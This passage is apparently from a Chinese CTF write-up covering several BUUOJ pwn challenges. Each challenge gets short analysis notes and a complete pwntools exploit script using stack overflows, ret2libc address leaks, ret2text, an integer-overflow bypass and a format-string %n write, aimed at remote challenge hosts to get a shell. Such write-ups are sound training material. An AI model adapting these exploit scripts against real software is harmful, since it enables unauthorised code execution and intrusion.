+<li>逆向程序<code>main</code>函数，发现程序先会让用户输入向<code>name</code>输入<code>64</code>字节，而<code>name</code>是在<code>bss</code>段中的一个全局变量</li>
+<li>还发现了<code>gets()</code>这个函数，但是没有发现<code>system()</code>函数</li>
+</ul>
+<p><img alt="image-20250411225320341" src="image-20250411225320341.png" /></p>
+<ul>
+<li>这时我们就可以得到思路，我们将<code>/bin/sh</code>写入到<code>name</code>中，然后正常打<code>ret2libc</code>，注意栈对齐</li>
+<li>exp如下：</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc-2.27.so&#39;</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">28795</span><span class="p">)</span>
+<span class="c1">#p = process(&#39;./ciscn_2019_n_5&#39;)</span>
+<span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x400713</span>
+<span class="n">puts_got</span> <span class="o">=</span> <span class="mh">0x601018</span>
+<span class="n">puts_plt</span> <span class="o">=</span> <span class="mh">0x4004E0</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x64</span>
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x28</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span>
+<span class="n">payload</span><span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x400636</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;What do you want to say to me?</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">puts_addr</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;leak--&gt;&#39;</span><span class="p">,</span><span class="n">puts_addr</span><span class="p">)</span>
+<span class="n">puts_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">puts_addr</span><span class="p">,</span><span class="s1">&#39;little&#39;</span><span class="p">)</span>
+<span class="n">libc_addr</span> <span class="o">=</span> <span class="n">puts_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
+<span class="n">sys_addr</span> <span class="o">=</span> <span class="n">libc_addr</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x64</span><span class="o">-</span><span class="mh">0x8</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x28</span> <span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x4006AA</span><span class="p">)</span><span class="o">+</span>  <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x601080</span><span class="p">)</span>
+<span class="n">payload</span><span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">sys_addr</span><span class="p">)</span><span class="c1"># + p64(0x400636)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<p><img alt="image-20250411230450166" src="image-20250411230450166.png" /></p>
+<h2 id="18_not_the_same_3dsctf_2016">题目18_not_the_same_3dsctf_2016</h2>
+<ul>
+<li>考点：<code>栈溢出</code>、<code>32位程序</code>、<code>静态编译</code>、<code>ret2text</code></li>
+<li>查看保护机制</li>
+</ul>
+<p><img alt="image-20250411230700366" src="image-20250411230700366.png" /></p>
+<ul>
+<li>逆向程序，先查看<code>main</code>函数。发现程序就一个<code>gets()</code></li>
+</ul>
+<p><img alt="image-20250411230738801" src="image-20250411230738801.png" /></p>
+<ul>
+<li>还发现了这个函数</li>
+</ul>
+<p><img alt="image-20250411231249559" src="image-20250411231249559.png" /></p>
+<ul>
+<li>思路就是栈溢出返回到<code>get_secret()</code>这个函数中，然后再调用<code>write</code>函数（也可以调用printf函数更方便，这里也选择write函数）将<code>flag</code>打印出来。</li>
+<li>但是经过尝试好像使用<code>printf</code>函数会报错，具体原因没去查看</li>
+<li>exp如下：</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">27286</span><span class="p">)</span>
+<span class="c1">#p = process(&#39;./not_the_same_3dsctf_2016&#39;)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x2d</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x80489A0</span><span class="p">)</span>
+<span class="n">payload</span><span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x80489E0</span><span class="p">)</span>
+<span class="n">printf_addr</span> <span class="o">=</span> <span class="mh">0x804F0A0</span>
+<span class="n">write_addr</span> <span class="o">=</span> <span class="mh">0x806E270</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x2d</span>  <span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">write_addr</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x1</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0x80ECA2D</span><span class="p">)</span> <span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0x40</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<p><img alt="image-20250411232312380" src="image-20250411232312380.png" /></p>
+<h2 id="19_ciscn_2019_en_2">题目19_ciscn_2019_en_2</h2>
+<ul>
+<li>这题与<code>题目11_ciscn_2019_c_1</code>一模一样，只是异或的数据不同，直接照抄该题的exp，将接收到的<code>l</code>修改为<code>o</code>即可。</li>
+<li>exp如下：</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="c1">#p = process(&#39;./ciscn_2019_c_1&#39;)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc-2.27.so&#39;</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">25580</span><span class="p">)</span>
+<span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x400c83</span>
+<span class="n">ret</span> <span class="o">=</span> <span class="mh">0x4006b9</span>
+<span class="n">puts_plt</span> <span class="o">=</span> <span class="mh">0x4006E0</span>
+<span class="n">puts_got</span> <span class="o">=</span> <span class="mh">0x602020</span>
+<span class="n">encrypt</span> <span class="o">=</span> <span class="mh">0x4009A0</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x1</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x50</span><span class="o">-</span><span class="mi">2</span><span class="p">)</span><span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x8</span>
+<span class="n">payload</span><span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span>
+<span class="n">payload</span><span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">encrypt</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
+<span class="c1">#gdb.attach(p)</span>
+<span class="c1">#pause()</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;o</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">leak</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;leak---&gt;&#39;</span><span class="p">,</span><span class="n">leak</span><span class="p">)</span>
+<span class="n">puts_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">leak</span><span class="p">,</span><span class="s1">&#39;little&#39;</span><span class="p">)</span>
+<span class="n">libc_addr</span> <span class="o">=</span> <span class="n">puts_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
+<span class="n">sys_addr</span> <span class="o">=</span> <span class="n">libc_addr</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
+<span class="n">sh_addr</span> <span class="o">=</span> <span class="n">libc_addr</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x1</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x50</span><span class="o">-</span><span class="mi">2</span><span class="p">)</span><span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x8</span>
+<span class="n">payload</span><span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">sh_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">sys_addr</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<h2 id="20_ciscn_2019_ne_5">题目20_ciscn_2019_ne_5</h2>
+<ul>
+<li>考点：</li>
+<li>查看保护机制</li>
+</ul>
+<p><img alt="image-20250411233825792" src="image-20250411233825792.png" /></p>
+<ul>
+<li>对程序进行逆向，先查看<code>main</code>函数，<code>main</code>函数的主要逻辑就是一个菜单。</li>
+<li>这个菜单前面主要就是实现一个登录，并且貌似没有栈溢出。</li>
+</ul>
+<p><img alt="image-20250411233848276" src="image-20250411233848276.png" /></p>
+<ul>
+<li>查看完各个函数之后发现漏洞点在这个位置，这个位置会导致栈溢出</li>
+<li>但是要注意<code>strcpy</code>遇到<code>\x00</code>这个字符串后会被截断。</li>
+</ul>
+<p><img alt="image-20250412004946831" src="image-20250412004946831.png" /></p>
+<ul>
+<li>而我们的<code>src</code>是通过这个地方来写入的</li>
+</ul>
+<p><img alt="image-20250412005014741" src="image-20250412005014741.png" /></p>
+<ul>
+<li>还发现这边有个<code>system()</code>函数</li>
+</ul>
+<p><img alt="image-20250412005512844" src="image-20250412005512844.png" /></p>
+<ul>
+<li>此时我们就可以通过溢出构造rop链，同时写入<code>/bin/sh</code>到程序的<code>bss</code>段中即可，但是这里没有<code>read</code>函数，不好写<code>/bin/sh</code>到<code>bss</code>段</li>
+<li>这边就直接采取泄露的思路，注意<code>scanf()</code>这个函数有以下坑点</li>
+</ul>
+<p><img alt="image-20250412015136193" src="image-20250412015136193.png" /></p>
+<ul>
+<li>并且不知道怎么回事程序不行<code>getshell</code>，最终发现好像是<code>libc</code>错了</li>
+</ul>
+<p><img alt="image-20250412021110368" src="image-20250412021110368.png" /></p>
+<ul>
+<li>exp如下：</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">numpy</span> <span class="kn">import</span> <span class="n">put</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="c1">#p = process(&#39;./ciscn_2019_ne_5&#39;)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc-2.27.so&#39;</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">25991</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;administrator&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
+<span class="n">puts_got</span> <span class="o">=</span> <span class="mh">0x804A020</span>
+<span class="n">puts_plt</span> <span class="o">=</span> <span class="mh">0x80484C0</span>
+<span class="n">main_addr</span> <span class="o">=</span> <span class="mh">0x8048722</span>
+<span class="n">printf_got</span> <span class="o">=</span> <span class="mh">0x804A014</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x48</span><span class="o">+</span><span class="mh">0x4</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span><span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">main_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">printf_got</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;4&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;aaaaaa&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+<span class="n">printf_addr</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="mi">4</span><span class="p">]</span>
+<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;leak---&gt;&#39;</span><span class="p">,</span><span class="n">printf_addr</span><span class="p">)</span>
+<span class="n">printf_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">printf_addr</span><span class="p">,</span><span class="s1">&#39;little&#39;</span><span class="p">)</span>
+<span class="n">libc_addr</span> <span class="o">=</span> <span class="n">printf_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;printf&#39;</span><span class="p">]</span>
+<span class="n">sh_addr</span> <span class="o">=</span> <span class="n">libc_addr</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;administrator&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x48</span><span class="o">+</span><span class="mh">0x4</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x80486B9</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">sh_addr</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;4&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<p><img alt="image-20250412021754912" src="image-20250412021754912.png" /></p>
+<h2 id="21___2018_rop">题目21_铁人三项(第五赛区)__2018_rop</h2>
+<ul>
+<li>考点：<code>栈溢出</code>、<code>ret2libc</code></li>
+<li>查看保护机制</li>
+</ul>
+<p><img alt="image-20250412021504484" src="image-20250412021504484.png" /></p>
+<ul>
+<li>逆向程序，先查看<code>main</code>函数，发现<code>main</code>函数就调用了这俩个函数</li>
+</ul>
+<p><img alt="image-20250412021533566" src="image-20250412021533566.png" /></p>
+<ul>
+<li>再来查看<code>be_nice_to_people()</code>，发现没啥漏洞</li>
+</ul>
+<p><img alt="image-20250412021554636" src="image-20250412021554636.png" /></p>
+<ul>
+<li>接下去继续看<code>vulnerable_function()</code>，发现存在栈溢出</li>
+<li>继续查找好没有看到<code>system</code>和<code>/bin/sh</code>这个字符串，所以打<code>ret2libc</code></li>
+</ul>
+<p><img alt="image-20250412021623279" src="image-20250412021623279.png" /></p>
+<ul>
+<li>exp如下：</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">os</span> <span class="kn">import</span> <span class="n">system</span>
+<span class="kn">from</span> <span class="nn">numpy</span> <span class="kn">import</span> <span class="n">put</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="c1">#p = process(&#39;./2018_rop&#39;)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc-2.27.so&#39;</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">29708</span><span class="p">)</span>
+<span class="n">write_got</span> <span class="o">=</span> <span class="mh">0x804A010</span>
+<span class="n">write_plt</span> <span class="o">=</span> <span class="mh">0x80483A0</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x88</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x4</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">write_plt</span><span class="p">)</span><span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x8048474</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">write_got</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x88</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x4</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">write_plt</span><span class="p">)</span><span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x8048474</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">write_got</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x8</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">write_addr</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()[:</span><span class="mi">4</span><span class="p">]</span>
+<span class="n">write_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">write_addr</span><span class="p">,</span><span class="s1">&#39;little&#39;</span><span class="p">)</span>
+<span class="n">libc_addr</span> <span class="o">=</span> <span class="n">write_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
+<span class="n">sys_addr</span> <span class="o">=</span> <span class="n">libc_addr</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
+<span class="n">sh_addr</span> <span class="o">=</span> <span class="n">libc_addr</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x88</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x4</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">sys_addr</span><span class="p">)</span><span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x8048474</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">sh_addr</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<p><img alt="image-20250412022814260" src="image-20250412022814260.png" /></p>
+<h2 id="22_bjdctf_2020_babystack2">题目22_bjdctf_2020_babystack2</h2>
+<ul>
+<li>考点：<code>整数溢出</code>、<code>栈溢出</code>、<code>ret2text</code></li>
+<li>检查一下保护机制</li>
+</ul>
+<p><img alt="image-20250412023358660" src="image-20250412023358660.png" /></p>
+<ul>
+<li>逆向程序，先查看<code>main</code>函数，发现是一个整数溢出</li>
+</ul>
+<p><img alt="image-20250412022951829" src="image-20250412022951829.png" /></p>
+<ul>
+<li>
+<p>直接输入<code>-1</code>，绕过检查，绕过之后直接栈溢出</p>
+</li>
+<li>
+<p>还发现了后门函数</p>
+</li>
+</ul>
+<p><img alt="image-20250412023040935" src="image-20250412023040935.png" /></p>
+<ul>
+<li>exp如下，打的时候注意栈对齐：</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="c1">#p = process(&#39;./bjdctf_2020_babystack2&#39;)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc-2.27.so&#39;</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">27593</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;-1&#39;</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x18</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40072A</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<p><img alt="image-20250412023609084" src="image-20250412023609084.png" /></p>
+<h2 id="23_jarvisoj_fm">题目23_jarvisoj_fm</h2>
+<ul>
+<li>考点：<code>字符串格式化漏洞</code>、<code>简单%n的使用</code></li>
+<li>检查保护机制</li>
+</ul>
+<p><img alt="image-20250412024322479" src="image-20250412024322479.png" /></p>
+<ul>
+<li>逆向程序，先查看一下<code>main</code>函数，主要漏洞出现在这里，这里直接使用<code>%n</code>修改变量<code>x</code></li>
+<li><code>x</code>在bss段上，所以我们还需要先写入<code>x</code>的地址。然后确定偏移</li>
+</ul>
+<p><img alt="image-20250412024434834" src="image-20250412024434834.png" /></p>
+<ul>
+<li>接下来动调确定偏移<code>%11$p</code></li>
+<li>
+<p>然后使用<code>%11$lln</code>直接修改</p>
+</li>
+<li>
+<p>接下来就直接写exp打</p>
+</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="c1">#p = process(&#39;./fm&#39;)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc-2.27.so&#39;</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">28823</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span>  <span class="n">p32</span><span class="p">(</span><span class="mh">0x804A02C</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;%11$lln&#39;</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
